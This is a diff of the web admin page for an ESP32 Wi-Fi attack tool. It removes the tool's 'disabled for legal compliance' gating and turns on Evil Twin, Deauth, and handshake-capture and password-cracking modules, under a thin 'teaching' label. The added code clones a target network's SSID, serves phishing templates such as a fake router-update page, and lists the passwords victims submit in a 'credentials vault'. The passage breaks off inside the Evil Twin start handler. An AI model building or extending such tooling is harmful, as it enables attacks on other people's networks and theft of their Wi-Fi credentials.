@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ESP32 · 后台管理</title>
+<title>ESP32 · 无线网络安全教学与管理后台</title>
 <style>
 :root{
   --bg:#f5f0e8; --ink:#111; --cream:#faf3e3; --yellow:#ffe14d; --yellow-bd:#f5d943;
@@ -14,8 +14,7 @@
 html[data-theme=dark]{--bg:#17140f;--ink:#f5efe4;--cream:#241f18;--yellow:#6b5615;--yellow-bd:#5c4a12;
   --orange:#7a4d1c;--pink:#4d2738;--blue:#1d4258;--purple:#3a2f66;--red-bg:#4d2723;--green-bg:#26451f;--sh:4px 4px 0 #000;--sh2:2px 2px 0 #000}
 *{box-sizing:border-box}
-body{margin:0;background:var(--bg);color:var(--ink);font-family:"PingFang SC",-apple-system,"Microsoft YaHei",sans-serif;font-size:14px;line-height:1.6;
-  padding-top:58px}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:"PingFang SC",-apple-system,"Microsoft YaHei",sans-serif;font-size:14px;line-height:1.6;padding-top:58px}
 .mono{font-family:"SF Mono",Menlo,Consolas,monospace}
 /* ---------- topbar ---------- */
 #topbar{position:fixed;top:0;left:0;right:0;z-index:50;display:flex;align-items:center;gap:12px;
@@ -30,7 +29,7 @@ html[data-theme=dark] #burger .l{background:#f5efe4}
 #topbar h1{margin:0;font-size:16px;font-weight:900;font-family:"SF Mono",Menlo,monospace;flex:1;letter-spacing:.5px}
 .tp-pill{display:flex;align-items:center;gap:6px;background:var(--cream);border:var(--bd);border-radius:999px;
   padding:6px 12px;font-size:12px;font-weight:800;box-shadow:var(--sh2)}
-#tp-theme{cursor:pointer}
+#tpTheme{cursor:pointer}
 .memb{width:74px;height:10px;border:2px solid #111;border-radius:4px;overflow:hidden;background:#fff}
 .memb i{display:block;height:100%;background:#35c04a}
 /* ---------- drawer ---------- */
@@ -71,7 +70,7 @@ html[data-theme=dark] .mod small{color:#cbb977}
 .kv .v{font-weight:900;font-family:"SF Mono",Menlo,monospace}
 .sub{display:flex;align-items:center;justify-content:center;gap:10px;margin:8px 0 14px;flex-wrap:wrap}
 .btn{border:var(--bd);border-radius:12px;padding:10px 16px;font-size:14px;font-weight:900;cursor:pointer;
-  color:#111;box-shadow:var(--sh);background:var(--yellow);transition:transform .06s,box-shadow .06s;font-family:inherit}
+  color:#111;box-shadow:var(--sh);background:var(--yellow);transition:transform .06s,box-shadow .06s;font-family:inherit;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;gap:6px}
 .btn:hover{transform:translate(-1px,-1px);box-shadow:5px 5px 0 #111}
 .btn:active{transform:translate(3px,3px);box-shadow:1px 1px 0 #111}
 .btn:disabled{opacity:.55;cursor:not-allowed}
@@ -93,37 +92,48 @@ html[data-theme=dark] .dg small{color:#cbb977}
 .legal li{font-size:12.5px;margin:5px 0}
 .logc{background:#0a0a0a;color:#33ff66;font-family:"SF Mono",Menlo,monospace;font-size:12.5px;line-height:1.7;
   padding:12px 14px;border-radius:10px;height:170px;overflow-y:auto;white-space:pre-wrap;border:var(--bd)}
-/* ---------- scan ---------- */
+/* ---------- scan & tables ---------- */
 .scanband{background:#1b1b1b;border:var(--bd);border-radius:var(--r);box-shadow:var(--sh);
   padding:12px 14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:16px;position:relative}
 .scanband .st{color:#ffe14d;font-size:12px;font-weight:800;font-family:"SF Mono",Menlo,monospace}
 .filters{display:flex;gap:8px;align-items:center;color:#111;background:var(--cream);border:var(--bd);
-  border-radius:999px;padding:6px 10px}
-.filters label{font-size:12px;font-weight:800;display:flex;align-items:center;gap:4px;cursor:pointer}
-.table-wrap{background:#1b1b1b;border:var(--bd);border-radius:var(--r);box-shadow:var(--sh);
-  padding:0;max-height:560px;overflow:auto;min-height:200px}
-table{width:100%;border-collapse:collapse;font-family:"SF Mono",Menlo,monospace;font-size:12.5px}
-th{position:sticky;top:0;background:var(--yellow);color:#111;text-align:left;padding:9px 10px;font-size:12px;
-  border-bottom:2px solid #000;z-index:1}
-td{padding:8px 10px;border-bottom:1px solid #333;color:#eee}
-td.ssid{font-weight:800;color:#ffe14d}
-td.rssi{color:#28c94f;font-weight:800}
-.tbtn{border:2px solid #000;border-radius:8px;padding:4px 12px;font-weight:900;font-size:12px;cursor:pointer;box-shadow:1px 1px 0 #000}
+  border-radius:10px;padding:5px 10px;font-size:12px;font-weight:800}
+.filters label{cursor:pointer;display:flex;align-items:center;gap:3px}
+.table-wrap{border:var(--bd);border-radius:var(--r);box-shadow:var(--sh);overflow:hidden;background:#fff;margin-bottom:18px}
+html[data-theme=dark] .table-wrap{background:#1b1b1b}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{background:var(--yellow);padding:10px;font-weight:900;text-align:left;border-bottom:var(--bd);color:#111}
+td{padding:8px 10px;border-bottom:1px solid #ddd}
+html[data-theme=dark] td{border-bottom-color:#333}
+tr:hover td{background:#0000000a}
+.hidden-ssid{color:#8a7f6d;font-style:italic}
+.tbtn{border:2px solid #111;background:var(--yellow);padding:3px 8px;border-radius:6px;font-weight:800;cursor:pointer}
 .tbtn.pink{background:var(--pink)}
-.tbtn:disabled{opacity:.45;cursor:default}
-.nores{padding:40px;text-align:center;color:#888;font-weight:800}
-.hidden-ssid{color:#ff7f6e}
-/* ---------- config ---------- */
-.frow{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin:8px 0}
-.frow label{font-size:13px;font-weight:800;min-width:92px}
-.frow .val{font-weight:900;font-family:"SF Mono",Menlo,monospace;background:var(--yellow);
-  border:var(--bd);border-radius:10px;padding:8px 14px;flex:1}
+.frow{display:flex;align-items:center;gap:12px;margin:10px 0;flex-wrap:wrap}
+.frow label{width:110px;font-weight:800;color:#8a7f6d}
+.frow .val{font-weight:900;font-family:"SF Mono",Menlo,monospace}
+.frow input[type=text], .frow select{background:#fff;color:#111;font-weight:700;font-size:14px;
+  border:var(--bd);border-radius:10px;padding:8px 14px;flex:1;min-width:180px}
+html[data-theme=dark] .frow input[type=text], html[data-theme=dark] .frow select{background:#2a2a2a;color:#fff}
 select.mini{padding:8px 12px;font-weight:800;border:var(--bd);border-radius:10px;background:var(--yellow);font-family:inherit}
 .note{font-size:12px;color:#8a7f6d;margin-top:6px}
 .attack-banner{background:var(--yellow);border:var(--bd);border-radius:var(--r);box-shadow:var(--sh);padding:16px 18px;
   font-size:13px;font-weight:700;margin-bottom:16px}
 #toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:99;background:#111;color:#ffe14d;
   border:var(--bd);border-radius:12px;padding:10px 18px;font-weight:900;box-shadow:var(--sh);display:none}
+
+/* ---------- 3大板块专属样式 ---------- */
+.status-pill{display:inline-block;padding:3px 10px;border-radius:6px;font-weight:900;font-size:12px;border:2px solid #111}
+.status-pill.run{background:#35c04a;color:#111}
+.status-pill.idle{background:#ccc;color:#333}
+.pbar-wrap{border:3px solid #111;background:#fff;border-radius:10px;height:24px;overflow:hidden;position:relative;margin:10px 0}
+.pbar-fill{background:repeating-linear-gradient(45deg,#ffe14d,#ffe14d 10px,#ffa14d 10px,#ffa14d 20px);height:100%;width:0%;transition:width .2s}
+.pbar-text{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:12px;font-family:"SF Mono",monospace}
+.step-nodes{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:14px 0}
+@media(max-width:700px){.step-nodes{grid-template-columns:1fr 1fr}}
+.step-node{border:var(--bd);border-radius:10px;padding:10px;text-align:center;font-weight:800;background:#eee}
+.step-node.active{background:#35c04a;color:#111;box-shadow:var(--sh2)}
+.step-node small{display:block;font-size:10px;margin-top:4px}
 </style>
 </head>
 <body>
@@ -145,11 +155,11 @@ select.mini{padding:8px 12px;font-weight:800;border:var(--bd);border-radius:10px
   <div class="dr-sec">仪表板</div>
   <div class="dr-item on" data-page="dash">✳️ 状态总览</div>
 
-  <div class="dr-sec">WIFI 模块</div>
+  <div class="dr-sec">WIFI 教学实验模块</div>
   <div class="dr-item" data-page="scan">📶 扫描与嗅探</div>
-  <div class="dr-item dis" data-page="none">👤 邪恶双子攻击 <small>合规未启用</small></div>
-  <div class="dr-item dis" data-page="none">⬍ Karma攻击 <small>合规未启用</small></div>
-  <div class="dr-item dis" data-page="none">⛔ 取消认证器 <small>合规未启用</small></div>
+  <div class="dr-item" data-page="eviltwin">👤 邪恶双子 (Evil Twin)</div>
+  <div class="dr-item" data-page="deauth">⛔ 取消认证器 (Deauth)</div>
+  <div class="dr-item" data-page="handshake">⬍ 握手包与密码破解</div>
 
   <div class="dr-sec">系统</div>
   <div class="dr-item" data-page="cfg">⚙️ 配置</div>
@@ -161,69 +171,115 @@ select.mini{padding:8px 12px;font-weight:800;border:var(--bd);border-radius:10px
 
 <script>
 /* ================== helpers ================== */
-const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
-const fmtBytes=b=>b>=1048576?(b/1048576).toFixed(1)+' MB':(b/1024).toFixed(1)+'K';
-const up2=n=>String(n).padStart(2,'0');
-const fmtUp=s=>{const d=Math.floor(s/86400),h=Math.floor(s%86400/3600),m=Math.floor(s%3600/60),x=s%60;
-  return (d?d+'天':'')+up2(h)+':'+up2(m)+':'+up2(x)};
-const nowTs=()=>{const d=new Date();return '['+up2(d.getHours())+':'+up2(d.getMinutes())+':'+up2(d.getSeconds())+']'};
-function toast(t){const el=$('#toast');el.textContent=t;el.style.display='block';clearTimeout(el._t);el._t=setTimeout(()=>el.style.display='none',1800)}
-async function api(path,opt){try{const r=await fetch(path,opt);const j=await r.json().catch(()=>({}));if(!r.ok)throw new Error(j.error||r.status);return j}catch(e){log('[SYSTEM] 请求失败 '+path+' '+e.message,'t-err');throw e}}
+const $ = s => document.querySelector(s);
+const $$ = s => document.querySelectorAll(s);
+const toast = msg => {
+  const t = $('#toast'); t.textContent = msg; t.style.display = 'block';
+  clearTimeout(t._tm); t._tm = setTimeout(() => t.style.display = 'none', 2400);
+};
+const fmtBytes = b => {
+  if (b == null) return '--';
+  if (b < 1024) return b + ' B';
+  if (b < 1048576) return (b / 1024).toFixed(1) + ' KB';
+  return (b / 1048576).toFixed(2) + ' MB';
+};
+const fmtUp = s => {
+  if (s == null) return '--';
+  const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
+  return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(sec).padStart(2,'0')}`;
+};
+const esc = s => String(s ?? '').replace(/[<>&"]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;' }[c]));
+function fragPct(free, maxBlock) { return free > 0 ? Math.max(0, (100 - 100 * maxBlock / free)).toFixed(0) : '--'; }
 
-/* ================== state ================== */
-const state={info:null,target:null,scan:[],logId:0,filter:'all',scanning:false};
+const state = {
+  info: null, target: null, scan: [], filter: 'all', logId: 0,
+  deauthStatus: { running: false, count: 0, rate: 10, channel: 6, reason: 1 },
+  handshakeStatus: { capturing: false, m1: false, m2: false, m3: false, m4: false, pmkid: false, cracking: false, progress: 0, total: 7153, crackedPass: '' },
+  creds: []
+};
 
-/* ================== log ================== */
-function log(txt,cls){const c=$('#logc');if(!c)return;
-  c.textContent+=nowTs()+(cls?' ':' ')+txt+'\n';c.scrollTop=c.scrollHeight}
+async function api(path, opts = {}) {
+  const r = await fetch(path, opts);
+  if (!r.ok) throw new Error((await r.text()) || r.statusText);
+  return r.json();
+}
+function log(line, cls = '') {
+  const c = $('#logc'); if (!c) return;
+  const d = new Date(), ts = `[${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}]`;
+  c.textContent += ts + ' ' + line + '\n';
+  c.scrollTop = c.scrollHeight;
+}
 
 /* ================== shell ================== */
-const burger=$('#burger'),drawer=$('#drawer'),scrim=$('#scrim');
-const toggleDrawer=o=>{const d=o??!drawer.classList.contains('open');drawer.classList.toggle('open',d);burger.classList.toggle('bx',d);scrim.style.display=d?'block':'none'};
-burger.onclick=()=>toggleDrawer();
-scrim.onclick=()=>toggleDrawer(false);
-$$('#drawer .dr-item').forEach(el=>el.onclick=()=>{
-  if(el.dataset.page==='none'){toast('为遵守法律法规，主动攻击类模块未启用');return}
-  $$('#drawer .dr-item').forEach(x=>x.classList.remove('on'));el.classList.add('on');
-  toggleDrawer(false);go(el.dataset.page);
+const burger = $('#burger'), drawer = $('#drawer'), scrim = $('#scrim');
+const toggleDrawer = o => {
+  const d = o ?? !drawer.classList.contains('open');
+  drawer.classList.toggle('open', d);
+  burger.classList.toggle('bx', d);
+  scrim.style.display = d ? 'block' : 'none';
+};
+burger.onclick = () => toggleDrawer();
+scrim.onclick = () => toggleDrawer(false);
+$$('#drawer .dr-item').forEach(el => el.onclick = () => {
+  if (el.dataset.page === 'none') { toast('模块未配置'); return; }
+  $$('#drawer .dr-item').forEach(x => x.classList.remove('on'));
+  el.classList.add('on');
+  toggleDrawer(false);
+  go(el.dataset.page);
 });
-$('#tpTheme').onclick=()=>{const d=document.documentElement.dataset.theme==='dark'?'':'dark';
-  document.documentElement.dataset.theme=d;if(d)$('#tpTheme').textContent='🌙';else $('#tpTheme').textContent='☀️'};
+$('#tpTheme').onclick = () => {
+  const d = document.documentElement.dataset.theme === 'dark' ? '' : 'dark';
+  document.documentElement.dataset.theme = d;
+  $('#tpTheme').textContent = d ? '🌙' : '☀️';
+};
 
 /* ================== pages ================== */
-const pages={
-  dash:'状态总览', scan:'扫描与嗅探', cfg:'配置'
+const pages = {
+  dash: '状态总览',
+  scan: '扫描与嗅探',
+  eviltwin: '邪恶双子 (Evil Twin)',
+  deauth: '取消认证器 (Deauth)',
+  handshake: '握手包与密码破解',
+  cfg: '配置'
 };
-function go(p){
-  location.hash=p;
-  $('#pageTitle').textContent=pages[p]||pages.dash;
-  if(p==='dash')renderDash();
-  else if(p==='scan')renderScan();
-  else if(p==='cfg')renderCfg();
+function go(p) {
+  location.hash = p;
+  $('#pageTitle').textContent = pages[p] || pages.dash;
+  $$('#drawer .dr-item').forEach(el => {
+    el.classList.toggle('on', el.dataset.page === p);
+  });
+  if (p === 'dash') renderDash();
+  else if (p === 'scan') renderScan();
+  else if (p === 'eviltwin') renderEvilTwin();
+  else if (p === 'deauth') renderDeauth();
+  else if (p === 'handshake') renderHandshake();
+  else if (p === 'cfg') renderCfg();
 }
 
-/* ---------- 状态总览 ---------- */
-function legal(){
+function legal() {
   return `<div class="card legal"><h3>法律声明与免责条款</h3><ul>
   <li>攻击破解他人WiFi属于违法行为，视情节轻重可能面临民事赔偿、行政处罚甚至刑事处罚。</li>
-  <li>《计算机信息网络国际联网安全保护管理办法》明确规定，未经允许不得进入计算机信息网络或使用其资源</li>
+  <li>《计算机信息网络国际联网安全保护管理办法》明确规定，未经允许不得进入计算机信息网络或使用其资源。</li>
   <li>禁止将其用于任何未经授权的设备或网络，包括但不限于攻击、干扰、监听等行为。</li>
-  <li>本程序仅供学习研究网络安全通信为目的，请勿用于非法用途。</li>
+  <li>本程序仅供网络安全实验研究与防范教学，严禁用于任何非法侵入用途。</li>
   <li>使用者应自行确保其行为符合当地法律法规，并自行承担全部法律责任。</li></ul></div>`;
 }
-function fragPct(free,maxBlock){return free>0?Math.max(0,(100-100*maxBlock/free)).toFixed(0):'--'}
-function renderDash(){
-  $('#view').innerHTML=`
+
+/* ---------- 1. 状态总览 ---------- */
+function renderDash() {
+  $('#view').innerHTML = `
   <div class="banner"><div class="big">仪表板</div><div class="chip-st" id="sysState">读取中…</div></div>
-  <div class="grid g3"><div class="card mod o">扫描引擎<small id="mScan">--</small></div>
-    <div class="card mod p">接入点<small id="mAP">--</small></div>
-    <div class="card mod y">主动攻击模块<small style="color:#000">合规未启用</small></div></div>
+  <div class="grid g3">
+    <div class="card mod o">扫描引擎<small id="mScan">--</small></div>
+    <div class="card mod p">本机热点<small id="mAP">--</small></div>
+    <div class="card mod y">教学实验引擎<small id="mLab">空闲 · 待命</small></div>
+  </div>
   <div class="grid g3a">
     <div class="card"><h3>主要目标信息</h3><div id="tgtBox"></div></div>
-    <div class="card"><h3>本机热点</h3><div id="apBox"></div></div>
-    <div class="card"><h3>情报与捕获</h3><div id="capBox"></div></div>
+    <div class="card"><h3>本机热点状态</h3><div id="apBox"></div></div>
+    <div class="card"><h3>情报与捕获概览</h3><div id="capBox"></div></div>
   </div>
-  <div class="card rel"><span class="badge-ok">正常</span><h3>内存诊断</h3>
+  <div class="card rel"><span class="badge-ok">正常</span><h3>内存与硬件诊断</h3>
     <div class="diag">
       <div class="dg v"><b id="d1">--</b><small>可用</small></div>
       <div class="dg o"><b id="d2">--</b><small>最低水位</small></div>
@@ -232,117 +288,330 @@ function renderDash(){
     </div></div>
   ${legal()}
   <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
-  refreshInfo();
   renderTarget();
 }
-function renderTarget(){
-  const t=state.target, i=state.info;
-  if(t){
-    $('#tgtBox').innerHTML=`
-      <div class="kv"><span class="k">SSID</span><span class="v">${esc(t.ssid||'(隐藏)')}</span></div>
-      <div class="kv"><span class="k">MAC 地址</span><span class="v">${esc(t.bssid||'--')}</span></div>
-      <div class="kv"><span class="k">信道</span><span class="v mono">${t.channel??'--'}</span></div>
-      <div class="kv"><span class="k">安全</span><span class="v mono">${esc(t.auth||'--')}</span></div>
-      <div class="kv"><span class="k">信号</span><span class="v mono">${t.rssi??'--'} dBm</span></div>`;
-  }else{
-    $('#tgtBox').innerHTML=`<div class="kv"><span class="v" style="color:#8a7f6d">无目标 — 到「扫描与嗅探」页选择目标</span></div>`;
+function renderTarget() {
+  const t = state.target, i = state.info;
+  if ($('#tgtBox')) {
+    if (t) {
+      $('#tgtBox').innerHTML = `
+        <div class="kv"><span class="k">SSID</span><span class="v">${esc(t.ssid || '(隐藏)')}</span></div>
+        <div class="kv"><span class="k">MAC 地址</span><span class="v">${esc(t.bssid || '--')}</span></div>
+        <div class="kv"><span class="k">信道</span><span class="v mono">${t.channel ?? '--'}</span></div>
+        <div class="kv"><span class="k">安全</span><span class="v mono">${esc(t.auth || '--')}</span></div>
+        <div class="kv"><span class="k">信号</span><span class="v mono">${t.rssi ?? '--'} dBm</span></div>`;
+    } else {
+      $('#tgtBox').innerHTML = `<div class="kv"><span class="v" style="color:#8a7f6d">无目标 — 请前往「扫描与嗅探」设置</span></div>`;
+    }
   }
-  if(i){
-    $('#mScan').textContent='就绪 · 信道 '+i.channel;
-    $('#mAP').textContent=i.ssid+' · '+i.clients+' 客户端';
-    $('#capBox').innerHTML=`
-      <div class="kv"><span class="k">运行时长</span><span class="v">${fmtUp(i.uptime)}</span></div>
-      <div class="kv"><span class="k">固件版本</span><span class="v">${esc(i.version)}</span></div>
-      <div class="kv"><span class="k">芯片</span><span class="v mono">${esc(i.chip)}</span></div>`;
-    $('#sysState').textContent=i.ssid?'系统空闲 · '+i.ssid:'系统空闲';
-    $('#d1').textContent=fmtBytes(i.freeMem);
-    $('#d2').textContent=fmtBytes(i.minFreeMem??0);
-    $('#d3').textContent=fmtBytes(i.maxBlock??0);
-    $('#d4').textContent=fragPct(i.freeMem,i.maxBlock)+ '%';
-    $('#memBar').style.width=(i.memUsedPct??0)+'%';
-    $('#memTxt').textContent=(i.memUsedPct??0)+'%';
-    $('#up').textContent=fmtUp(i.uptime);
+  if ($('#apBox') && i) {
+    $('#apBox').innerHTML = `
+      <div class="kv"><span class="k">热点 SSID</span><span class="v">${esc(i.ssid)}</span></div>
+      <div class="kv"><span class="k">MAC</span><span class="v mono">${esc(i.mac)}</span></div>
+      <div class="kv"><span class="k">当前信道</span><span class="v mono">${i.channel}</span></div>
+      <div class="kv"><span class="k">客户端数</span><span class="v mono">${i.clients} 台</span></div>`;
+  }
+  if ($('#capBox') && i) {
+    const et = i.evilTwin || {};
+    const de = i.deauth || {};
+    const hs = i.handshake || {};
+    let labStatus = '空闲 · 待命';
+    if (et.active) labStatus = '运行中 · 邪恶双子';
+    else if (de.running) labStatus = '运行中 · 取消认证器';
+    else if (hs.capturing) labStatus = '运行中 · 握手包监听';
+    $('#mLab').textContent = labStatus;
+
+    $('#capBox').innerHTML = `
+      <div class="kv"><span class="k">双子状态</span><span class="v">${et.active ? '<b style="color:#35c04a">验证中 (' + esc(et.cloneSsid) + ')</b>' : '未启动'}</span></div>
+      <div class="kv"><span class="k">捕获密码凭据</span><span class="v">${et.credsCount ? '<b style="color:#ff7f6e">' + et.credsCount + ' 条</b>' : '0 条'}</span></div>
+      <div class="kv"><span class="k">Deauth 发送</span><span class="v mono">${de.count || 0} 帧</span></div>
+      <div class="kv"><span class="k">4次握手包</span><span class="v">${hs.m4 ? '<b style="color:#35c04a">已捕获完整</b>' : '未捕获'}</span></div>`;
+    $('#sysState').textContent = i.ssid ? '系统就绪 · ' + i.ssid : '系统空闲';
+    $('#mScan').textContent = '就绪 · 信道 ' + i.channel;
+    $('#mAP').textContent = i.ssid + ' · ' + i.clients + ' 客户端';
   }
 }
-const esc=s=>String(s??'').replace(/[<>&"]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]));
 
-/* ---------- 扫描与嗅探 ---------- */
-let scanFlag=false;
-async function realScan(){
-  if(scanFlag)return; scanFlag=true;
-  $('#scanStatus').textContent='正在扫描 …';
-  $('#btnScan').disabled=true;
-  try{
-    const j=await api('/api/scan');
-    state.scan=j.networks||[];
-    log('[SYSTEM] 扫描完成: '+state.scan.length+' 个 AP','t-ok');
-    $('#scanStatus').textContent=state.scan.length+' 个 AP 点击列表标题排序';
-  }catch(e){ $('#scanStatus').textContent='扫描失败: '+e.message; }
-  scanFlag=false;$('#btnScan').disabled=false;
+/* ---------- 2. 扫描与嗅探 ---------- */
+let scanFlag = false;
+async function realScan() {
+  if (scanFlag) return; scanFlag = true;
+  $('#scanStatus').textContent = '正在扫描周围无线信道 …';
+  $('#btnScan').disabled = true;
+  try {
+    const j = await api('/api/scan');
+    state.scan = j.networks || [];
+    log('[scan] 扫描完成: 共发现 ' + state.scan.length + ' 个 AP', 't-ok');
+    $('#scanStatus').textContent = state.scan.length + ' 个 AP 点击列表标题排序';
+  } catch (e) { $('#scanStatus').textContent = '扫描失败: ' + e.message; }
+  scanFlag = false; $('#btnScan').disabled = false;
   paintScan();
 }
-function passFilter(n){
-  const f=state.filter;
-  if(f==='24')return n.channel<=14;
-  if(f==='5')return n.channel>14;
+function passFilter(n) {
+  const f = state.filter;
+  if (f === '24') return n.channel <= 14;
+  if (f === '5') return n.channel > 14;
   return true;
 }
-function paintScan(){
-  const list=state.scan.filter(passFilter).sort((a,b)=>(b.hidden-a.hidden)||(b.rssi-a.rssi));
-  $('#tbody').innerHTML=list.length?list.map((n,idx)=>`
+function paintScan() {
+  const list = state.scan.filter(passFilter).sort((a,b) => (b.hidden - a.hidden) || (b.rssi - a.rssi));
+  $('#tbody').innerHTML = list.length ? list.map((n, idx) => `
     <tr>
-      <td class="ssid ${n.hidden?'hidden-ssid':''}">${n.hidden?'(隐藏网络)':esc(n.ssid)}</td>
-      <td class="rssi">${n.rssi}</td>
-      <td>${n.channel}</td><td>${esc(n.bssid)}</td><td>${esc(n.auth)}</td>
-      <td><button class="tbtn pink" ${state.target&&state.target.bssid===n.bssid?'disabled':''}
-        onclick='pickTarget(${JSON.stringify({ssid:n.ssid,bssid:n.bssid,channel:n.channel,rssi:n.rssi,auth:n.auth}).replace(/'/g,"&#39;")})'>目标</button>
+      <td class="ssid ${n.hidden ? 'hidden-ssid' : ''}">${n.hidden ? '(隐藏网络)' : esc(n.ssid)}</td>
+      <td class="rssi mono">${n.rssi} dBm</td>
+      <td class="mono">${n.channel}</td><td class="mono">${esc(n.bssid)}</td><td>${esc(n.auth)}</td>
+      <td><button class="tbtn pink" ${state.target && state.target.bssid === n.bssid ? 'disabled' : ''}
+        onclick='pickTarget(${JSON.stringify({ssid:n.ssid,bssid:n.bssid,channel:n.channel,rssi:n.rssi,auth:n.auth}).replace(/'/g,"&#39;")})'>设为主目标</button>
       </td>
-    </tr>`).join(''):`<tr><td colspan="6" class="nores">${
-      state.scanning?'' : (state.scan.length? '无 '+({all:'任何',24:'2.4G',5:'5G'}[state.filter])+' 频段结果' : '尚未扫描 — 点「开始扫描」')}</td></tr>`;
+    </tr>`).join('') : `<tr><td colspan="6" class="nores" style="text-align:center;padding:20px;color:#888">${
+      state.scan.length ? '无对应频段结果' : '尚未扫描 — 点「开始扫描」'}</td></tr>`;
 }
-function renderScan(){
-  $('#view').innerHTML=`
+function renderScan() {
+  $('#view').innerHTML = `
   <div class="scanband">
-    <button class="btn yellow" id="btnScan" style="background:var(--yellow)">开始扫描</button>
+    <button class="btn yellow" id="btnScan">开始扫描</button>
     <div class="filters">Filter:
       <label><input type="radio" name="f" value="all" checked> 全部</label>
       <label><input type="radio" name="f" value="24"> 2.4G</label>
       <label><input type="radio" name="f" value="5"> 5G</label>
     </div>
-    <span class="st" id="scanStatus">39@ 点击列表标题排序</span>
+    <span class="st" id="scanStatus">就绪 · 点击开始扫描</span>
   </div>
   <div class="table-wrap"><table>
-    <thead><tr><th>SSID</th><th>RSSI</th><th>信道</th><th>BSSID</th><th>安全</th><th>操作</th></tr></thead>
+    <thead><tr><th>SSID</th><th>RSSI</th><th>信道</th><th>BSSID</th><th>加密</th><th>操作</th></tr></thead>
     <tbody id="tbody"></tbody>
   </table></div>
   ${legal()}
   <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
-  $$('.filters input').forEach(r=>r.onchange=()=>{state.filter=r.value;paintScan()});
-  $('#btnScan').onclick=realScan;
+  $$('.filters input').forEach(r => r.onchange = () => { state.filter = r.value; paintScan(); });
+  $('#btnScan').onclick = realScan;
   paintScan();
 }
-async function pickTarget(t){
-  await api('/api/target',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(t)});
-  state.target=t;
-  log('[SYSTEM] 已选择目标: '+(t.ssid||'(隐藏)')+' @ '+t.channel,'t-ok');
-  toast('目标已设置: '+t.ssid);
-  go('dash');
+async function pickTarget(t) {
+  await api('/api/target', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(t) });
+  state.target = t;
+  log('[target] 已选择主目标: ' + (t.ssid || '(隐藏)') + ' @ ' + t.bssid + ' 信道' + t.channel);
+  toast('已设置主目标: ' + (t.ssid || t.bssid));
+  go('eviltwin');
 }
 
-/* ---------- 配置 ---------- */
-async function act(url,msg){
-  if(!confirm(msg))return;
-  await fetch(url,{method:'POST'});
+/* ---------- 3. 邪恶双子 (Evil Twin & 凭据捕获) ---------- */
+async function loadCreds() {
+  try {
+    const j = await api('/api/eviltwin/creds');
+    state.creds = j.credentials || [];
+    paintCreds();
+  } catch (e) {}
+}
+function paintCreds() {
+  const tb = $('#credsTbody'); if (!tb) return;
+  tb.innerHTML = state.creds.length ? state.creds.map(c => `
+    <tr>
+      <td class="mono">${c.id}</td>
+      <td class="mono">${esc(c.mac)}</td>
+      <td><b style="color:#d9534f;font-size:15px" class="mono">${esc(c.pass)}</b></td>
+      <td>${esc(c.time)}</td>
+    </tr>`).join('') : `<tr><td colspan="4" style="text-align:center;padding:16px;color:#888">暂无捕获凭据 (等待目标连接假热点并在认证页输入密码)</td></tr>`;
+}
+function renderEvilTwin() {
+  const t = state.target || {};
+  const active = state.info?.evilTwin?.active || false;
+  $('#view').innerHTML = `
+  <div class="card">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+      <h3 style="margin:0">👤 邪恶双子 (Evil Twin & 凭据钓鱼验证)</h3>
+      <span class="status-pill ${active ? 'run' : 'idle'}">${active ? '● 正在运行' : '○ 待命'}</span>
+    </div>
+    <p class="note" style="margin-bottom:14px">克隆主目标同名热点，配合 Captive Portal 强制门户将连接客户端重定向至路由器安全更新认证页，演示凭据钓鱼防范。</p>
+    <div class="frow"><label>目标网络</label><div class="val">${t.ssid ? esc(t.ssid) + ' (' + esc(t.bssid) + ')' : '<span style="color:#888">未设置 (可直接输入克隆名)</span>'}</div></div>
+    <div class="frow"><label>克隆 SSID</label><input type="text" id="etSsid" value="${esc(t.ssid || 'WiFi-Secure')}" placeholder="输入伪造的热点名称"></div>
+    <div class="frow"><label>诱导页面模板</label><select id="etTpl"><option value="1">路由器固件更新安全验证 (高仿弹窗)</option><option value="2">公共场所网络免密认证</option></select></div>
+    <div class="sub" style="margin-top:16px">
+      <button class="btn green" id="btnStartET" ${active ? 'disabled' : ''}>⚡ 启动双子验证</button>
+      <button class="btn red" id="btnStopET" ${!active ? 'disabled' : ''}>⏹ 停止实验</button>
+      <a class="btn yellow" href="/portal.html" target="_blank" rel="noopener">👁 预览钓鱼门户</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+      <h3 style="margin:0">📋 捕获的凭据记录 (Credentials Vault)</h3>
+      <div>
+        <button class="btn sm yellow" id="btnRefreshCreds">↻ 刷新</button>
+        <button class="btn sm gray" id="btnClearCreds">清空凭据</button>
+      </div>
+    </div>
+    <div class="table-wrap" style="margin:0">
+      <table>
+        <thead><tr><th>序号</th><th>客户端 IP/MAC</th><th>提交口令凭据</th><th>捕获时间</th></tr></thead>
+        <tbody id="credsTbody"></tbody>
+      </table>
+    </div>
+  </div>
+  ${legal()}
+  <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
+
+  $('#btnStartET').onclick = async () => {
+    const cloneSsid = $('#etSsid').value.trim() || 'Free-WiFi';
+    await api('/api/eviltwin/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cloneSsid }) });
